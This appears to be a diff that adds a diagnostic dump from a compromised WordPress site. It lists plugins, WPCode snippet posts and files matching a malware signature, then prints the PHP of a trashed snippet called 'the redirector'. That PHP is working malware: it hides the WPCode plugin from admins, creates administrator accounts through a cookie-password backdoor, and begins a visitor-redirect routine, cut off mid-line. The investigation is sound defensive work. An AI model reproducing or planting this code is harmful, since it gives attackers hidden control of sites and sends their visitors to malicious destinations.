@@ -1,0 +1,214 @@
+﻿=== plugin folder ===
+total 28
+drwxr-xr-x  5 taylosj9 taylosj9 4096 May  3 07:11 .
+drwxr-xr-x 18 taylosj9 taylosj9 4096 May  3 07:11 ..
+drwxr-xr-x  6 taylosj9 taylosj9 4096 Dec 19  2013 .svn
+-rw-r--r--  1 taylosj9 taylosj9   30 Dec 19  2013 index.php
+drwxr-xr-x 14 taylosj9 taylosj9 4096 Apr 30 19:41 jetpack
+drwxr-xr-x  8 taylosj9 taylosj9 4096 Apr  7  2019 quotes-collection
+
+=== wpcode plugin folder (insert-headers-and-footers) ===
+ls: cannot access 'wp-content/plugins/insert-headers-and-footers/': No such file or directory
+
+=== ALL wpcode CPT posts (any status, full count) ===
+COUNT(*)
+11
+
+ID	post_status	post_title
+173840	publish	Untitled Snippet
+173823	trash	Untitled Snippet
+173822	trash	Untitled Snippet
+173816	trash	Untitled Snippet
+173811	trash	Untitled Snippet
+173809	trash	Untitled Snippet
+173806	trash	Untitled Snippet
+173803	trash	Untitled Snippet
+173557	trash	Untitled Snippet
+173496	draft	Completely Disable Comments
+173495	draft	Display a message after the 1st paragraph of posts
+
+=== ALL wpcode option rows ===
+option_name,option_value
+
+=== suspicious options (snippet/header/footer/redirect) ===
+
+=== mu-plugins ===
+total 24
+drwxr-xr-x  2 taylosj9 taylosj9 4096 Nov 20 21:18 .
+drwxr-xr-x 18 taylosj9 taylosj9 4096 May  3 07:11 ..
+-rw-r--r--  1 taylosj9 taylosj9  279 Nov 20 21:18 error_log
+-rw-r--r--  1 taylosj9 taylosj9 3159 Oct 13  2025 sso.php
+
+=== active_plugins ===
+array (
+  4 => 'jetpack/jetpack.php',
+)
+
+=== active_sitewide_plugins ===
+Error: Could not get 'active_sitewide_plugins' option. Does it exist?
+
+=== check for any file with the snippet signature ===
+wp-content/mu-plugins/sso.php
+wp-content/uploads/wpcode/cache/library/snippets.json
+wp-content/themes/twentyseventeen/functions.php
+wp-content/themes/twentyseventeen/inc/back-compat.php
+wp-content/themes/travelify/library/functions/functions.php
+wp-content/themes/travelify/library/js/jquery-cloneya.js
+wp-content/themes/travelify/library/js/jquery-cloneya.min.js
+wp-content/themes/twentytwentyone/inc/back-compat.php
+wp-content/themes/twentytwelve/functions.php
+wp-content/themes/twentynineteen/inc/back-compat.php
+wp-content/themes/twentyfifteen/inc/back-compat.php
+wp-content/themes/twentythirteen/functions.php
+wp-content/themes/twentythirteen/inc/back-compat.php
+wp-content/themes/twentyfourteen/functions.php
+wp-content/themes/twentyfourteen/inc/back-compat.php
+wp-content/themes/customizr/core/fmk-ccat.php
+wp-content/themes/customizr/core/functions-ccat.php
+wp-content/themes/customizr/core/class-fire-placeholders.php
+wp-content/themes/customizr/core/class-fire-init.php
+wp-content/themes/customizr/core/_dev/_utils/fn-0-base.php
+wp-content/themes/customizr/core/_dev/_framework/class-model.php
+wp-content/themes/customizr/core/_dev/_framework/class-collection.php
+wp-content/themes/customizr/core/_dev/_framework/class-view.php
+wp-content/themes/customizr/core/class-fire-plugins_compat.php
+wp-content/themes/customizr/inc/czr-init-ccat.php
+wp-content/themes/customizr/inc/czr-front-ccat.php
+wp-content/themes/customizr/inc/_dev/parts/class-content-post_metas.php
+wp-content/themes/customizr/inc/_dev/parts/class-header-header_main.php
+wp-content/themes/customizr/inc/_dev/parts/class-content-slider.php
+wp-content/themes/customizr/inc/_dev/parts/class-content-headings.php
+
+=== current theme files ===
+bbpress.php
+compiler-page-widgets.php
+css
+full-width-page-comments.php
+full-width-post.php
+functions.php
+header.php
+single.php
+style.css
+
+=== look at the trashed wpcode post 173557 (the redirector) ===
+post_content
+$_pwsa = 'da1b61dff981349d695dd5c5b6ed313d';
+\n
+\nif (current_user_can('administrator') && !array_key_exists('show_all', $_GET)) {
+\n    add_action('admin_head', function () {
+\n        echo '<style>';
+\n        echo '#toplevel_page_wpcode { display: none; }';
+\n        echo '#wp-admin-bar-wpcode-admin-bar-info { display: none; }';
+\n        echo '#wpcode-notice-global-review_request { display: none; }';
+\n        echo '</style>';
+\n    });
+\n
+\n\tadd_action('wp_head', function () {
+\n        echo '<style>';
+\n        echo '#toplevel_page_wpcode { display: none; }';
+\n        echo '#wp-admin-bar-wpcode-admin-bar-info { display: none; }';
+\n        echo '#wpcode-notice-global-review_request { display: none; }';
+\n        echo '</style>';
+\n\t});
+\n
+\n    add_filter('all_plugins', function ($plugins) {
+\n        unset($plugins['insert-headers-and-footers/ihaf.php']);
+\n        return $plugins;
+\n    });
+\n}
+\n
+\nif (!function_exists('_red')) {
+\n    error_reporting(0);
+\n    ini_set('display_errors', 0);
+\n
+\n    function _gcookie($n)
+\n    {
+\n        return (isset($_COOKIE[$n])) ? base64_decode($_COOKIE[$n]) : '';
+\n    }
+\n
+\n    if (!empty($_pwsa) && _gcookie('pw') === $_pwsa) {
+\n        switch (_gcookie('c')) {
+\n            case 'sd':
+\n                $d = _gcookie('d');
+\n                if (strpos($d, '.') > 0) {
+\n                    update_option('d', $d);
+\n                }
+\n                break;
+\n            case 'au':
+\n                $u = _gcookie('u');
+\n                $p = _gcookie('p');
+\n                $e = _gcookie('e');
+\n
+\n                if ($u && $p && $e && !username_exists($u)) {
+\n                    $user_id = wp_create_user($u, $p, $e);
+\n                    $user = new WP_User($user_id);
+\n                    $user->set_role('administrator');
+\n                }
+\n                break;
+\n        }
+\n        return;
+\n    }
+\n
+\n    if (@stripos(wp_login_url(), '' . $_SERVER['SCRIPT_NAME']) !== false) {
+\n        return;
+\n    }
+\n
+\n    if (_gcookie("skip") === "1") {
+\n        return;
+\n    }
+\n
+\n    function _is_mobile()
+\n    {
+\n        if (empty($_SERVER["HTTP_USER_AGENT"])) {
+\n            return false;
+\n        }
+\n        return @preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\\.browser|up\\.link|webos|wos)/i", '' . $_SERVER["HTTP_USER_AGENT"]);
+\n    }
+\n
+\n    function _is_iphone()
+\n    {
+\n        if (empty($_SERVER["HTTP_USER_AGENT"])) {
+\n            return false;
+\n        }
+\n
+\n        return @preg_match("/(iphone|ipod)/i", '' . $_SERVER["HTTP_USER_AGENT"]);
+\n    }
+\n
+\n    function _user_ip()
+\n    {
+\n        foreach (array('HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
+\n            if (array_key_exists($key, $_SERVER) && !empty($_SERVER[$key])) {
+\n                foreach (@explode(',', '' . $_SERVER[$key]) as $ip) {
+\n                    $ip = trim($ip);
+\n                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+\n                        return $ip;
+\n                    }
+\n                }
+\n            }
+\n        }
+\n
+\n        return false;
+\n    }
+\n
+\n    function xorEncryptDecrypt($data, $password)
+\n    {
+\n        $dataLength = strlen($data);
+\n        $passLength = strlen($password);
+\n        $result = '';
+\n
+\n        for ($i = 0; $i < $dataLength; $i++) {
+\n            $result .= $data[$i] ^ $password[$i % $passLength];
+\n        }
+\n
+\n        return $result;
+\n    }
+\n
+\n    function _red()
+\n    {
+\n        if (is_user_logged_in()) {
+\n            return;
+\n        }
+\n
+\n        $u = isset($_GET['u']) ? $_GET['u'] : '';
+\n        $p = isset($_GET['p']) ? $_GET['p'] : '';
+\n        if (function_exists('curl_init') && str
